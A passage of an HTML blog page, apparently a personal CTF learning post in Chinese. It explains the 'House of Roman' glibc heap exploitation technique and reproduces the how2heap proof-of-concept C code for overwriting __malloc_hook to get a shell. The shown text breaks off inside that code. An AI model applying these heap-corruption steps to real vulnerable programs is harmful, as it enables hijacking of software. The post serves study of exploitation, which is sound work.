@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="House of Roman参考看雪上的这篇关于House of Roman的讲解，这个攻击看起来似乎可能比较实用？    glibc 2.29后Unsorted bin attack无法使用，添加了新的检查。且glibc 2.34后移除了__malloc_hook()。这个攻击大致分为以下几个步骤：   分配一个在malloc_hook附近的chunk，通过一个fastbin的double fr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How2Heap(6)——House of Roman">
+<meta property="og:url" content="http://example.com/2024/04/17/How2Heap-6/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="House of Roman参考看雪上的这篇关于House of Roman的讲解，这个攻击看起来似乎可能比较实用？    glibc 2.29后Unsorted bin attack无法使用，添加了新的检查。且glibc 2.34后移除了__malloc_hook()。这个攻击大致分为以下几个步骤：   分配一个在malloc_hook附近的chunk，通过一个fastbin的double fr">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-04-17T11:34:21.000Z">
+<meta property="article:modified_time" content="2024-04-20T09:36:51.040Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>How2Heap(6)——House of Roman · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">How2Heap(6)——House of Roman</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                How2Heap(6)——House of Roman
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/04/17</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>参考看雪上的这篇关于<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-280264.htm">House of Roman的讲解</a>，这个攻击看起来似乎可能比较实用？  </p>
+<blockquote>
+<p>glibc 2.29后Unsorted bin attack无法使用，添加了新的检查。且glibc 2.34后移除了__malloc_hook()。<br>这个攻击大致分为以下几个步骤：</p>
+</blockquote>
+<ol>
+<li>分配一个在malloc_hook附近的chunk，通过一个fastbin的double free或者是什么别的实现。总之最终我们要拥有一个fd内容为<code>malloc_hook-0x23</code>的chunk。然后将这个幻象chunk申请出来。这一步结束的时候我们可以控制malloc_hook附近的内存就可以了。<blockquote>
+<p>笔者为了方便理解，把那些我们精心伪造了结构的内存空间叫做fake_chunk，而那些其实本来并不可利用的，没有“真正”chunk的内存分配成为幻象chunk。</p>
+</blockquote>
+</li>
+<li>用unsorted bin attack攻击，在(1)中我们泄露了malloc_hook，用unsorted bin attack将malloc_hook写为main_arena+0x68&#x2F;0x96，whatever.</li>
+<li>利用1中我们获得的chunk，爆破&#x2F;写对应的低位，写为one_gadget或system，最后调用malloc(“&#x2F;bin&#x2F;sh”)。<br>总体来讲，它的本质思路是通过<em>某种手段（house of roman为fastbin+unsorted bin+堆风水）</em>获取一个malloc_hook附近的chunk，然后通过unsortedbin attack改写malloc_hook后爆破低位地址拿到shell。</li>
+</ol>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">该技术在GLibC 2.23、2.24上通过how2heap中的glibc_build.sh脚本在Ubuntu 16.04上进行了测试。2.25在Ubuntu 17.04上进行了测试。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">编译：gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC由Maxwell Dulin（Strikeout）编写</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用此函数关闭printf缓冲（会影响堆对齐）</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">   setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">   setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   该技术的主要目标是创建一种**无泄漏**的堆利用技术，以获取shell。这主要是通过**相对覆写**来实现的，以便在不知道指针的确切值的情况下将指针放置在正确的位置。</span></span><br><span class="line"><span class="comment">   第一步是获取__malloc_hook内的指针。这是通过创建一个看起来像下面这样的fastbin bin来完成的：ptr_to_chunk -&gt; ptr_to_libc。然后，我们使用相对覆写来将ptr_to_libc（使用相对覆写）指向__malloc_hook。</span></span><br><span class="line"><span class="comment">   下一步是对__malloc_hook运行未排序的bin攻击（现在可以从上一次攻击中控制）。同样，我们使用相对覆写来更改chunk-&gt;bk以运行未排序的bin攻击。</span></span><br><span class="line"><span class="comment">   最后，在将libc值放入__malloc_hook之后，我们对__malloc_hook的值再次进行相对覆写，以将其指向one_gadget、system或其他函数。</span></span><br><span class="line"><span class="comment">   现在，下一次运行malloc时，我们就可以弹出一个shell！:) </span></span><br><span class="line"><span class="comment">   但是，这是有代价的：必须暴力破解12位随机数（成功的概率为0.02%）。</span></span><br><span class="line"><span class="comment">   *House of Roman*的原始文档可以在以下链接找到：https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions。</span></span><br><span class="line"><span class="comment">   此技术要求能够通过UAF或溢出等方式编辑fastbin和unsorted bin指针。此外，还需要对分配大小和释放有良好的控制能力。----&gt;堆风水</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="type">char</span>* introduction = <span class="string">&quot;\n欢迎来到罗马之家\n\n&quot;</span></span><br><span class="line">             <span class="string">&quot;这是一种无泄漏的堆利用技术。\n&quot;</span></span><br><span class="line">             <span class="string">&quot;攻击分为三个阶段：\n\n&quot;</span></span><br><span class="line">             <span class="string">&quot;1. 将fastbin块指向__malloc_hook。\n&quot;</span></span><br><span class="line">             <span class="string">&quot;2. 对__malloc_hook运行未排序的bin攻击。\n&quot;</span></span><br><span class="line">             <span class="string">&quot;3. 在__malloc_hook处对main_arena进行相对覆写。\n\n&quot;</span></span><br><span class="line">             <span class="string">&quot;上述所有内容都是使用两个主要概念完成的：相对覆写和堆风水。\n\n&quot;</span></span><br><span class="line">             <span class="string">&quot;然而，这种技术是有代价的：需要暴力破解12位的熵。\n&quot;</span></span><br><span class="line">             <span class="string">&quot;这意味着这种技术只有在每4096次尝试中成功一次，即0.02%的概率。\n&quot;</span></span><br><span class="line">             <span class="string">&quot;**注意**：为了这个漏洞的目的，我们设置了随机值以使其保持一致。\n\n\n&quot;</span>;</span><br><span class="line">   <span class="built_in">puts</span>(introduction);	</span><br><span class="line">   init();</span><br><span class="line">   <span class="comment">/*	</span></span><br><span class="line"><span class="comment">   第1部分：Fastbin块指向__malloc_hook</span></span><br><span class="line"><span class="comment">   首先，我们需要获得一个在fastbin中具有指向fd的堆块的指针。</span></span><br><span class="line"><span class="comment">   然后，我们将该块指向指向LibC的指针（在另一个堆块中）。</span></span><br><span class="line"><span class="comment">   为了实现上述配置以执行相对覆写，需要进行大量的堆风水。</span></span><br><span class="line"><span class="comment">   有两种方法可以获得指向libC的指针：</span></span><br><span class="line"><span class="comment">      - 从small/large/unsorted_bins中拆分一个块，将其分配到0x70的大小。</span></span><br><span class="line"><span class="comment">      - 将先前使用的small/large块的大小覆盖为0x71。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   为了举例，这里使用了第一种选项，因为它需要更少的漏洞。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;第1步：将fastbin块指向__malloc_hook\n\n&quot;</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;使用堆风水设置相对覆写的块。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 将此作为稍后编辑堆指针以指向LibC值的UAF块。</span></span><br><span class="line">   <span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line">   <span class="comment">// 分配此块以获得相对偏移后的良好对齐（只想覆盖一个字节以防止堆上的4位暴力破解）。</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">   <span class="comment">// 偏移0x100</span></span><br><span class="line">   <span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">   <span class="comment">// 偏移0x190</span></span><br><span class="line">   <span class="comment">// 此指针将用于对&#x27;main_arena_use&#x27;块进行相对偏移</span></span><br><span class="line">   <span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">   <span class="comment">// 释放该块以将其放入unsorted_bin中。</span></span><br><span class="line">   <span class="comment">// 此块的fd和bk指针都将指向main_arena + 0x68。</span></span><br><span class="line">   <span class="built_in">free</span>(main_arena_use);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">   获取unsorted_bin中的一部分块（刚刚释放的块）。</span></span><br><span class="line"><span class="comment">   我们想要这个块，因为该块的fd和bk将包含main_arena指针（稍后用于相对覆写）。</span></span><br><span class="line"><span class="comment">   该块的大小特别设置为0x60，以将其放入0x70的fastbin中。</span></span><br><span class="line"><span class="comment">   这必须是相同的大小，因为__malloc_hook伪造块（稍后使用）使用了0x7f的fastbin大小。malloc中有一个安全检查，要求块的大小与fastbin大小匹配。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;分配一个块，其中包含指向LibC main_arena的指针。\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 偏移0x100。fd和bk中有main_arena + 0x68。</span></span><br><span class="line">   <span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">   <span class="comment">//// 注意：这不是攻击的一部分... \\\</span></span><br><span class="line"><span class="comment">   // __malloc_hook是根据偏移计算的，以便找到偏移量，使得此攻击适用于一些GLibC版本。</span></span><br><span class="line">   <span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span 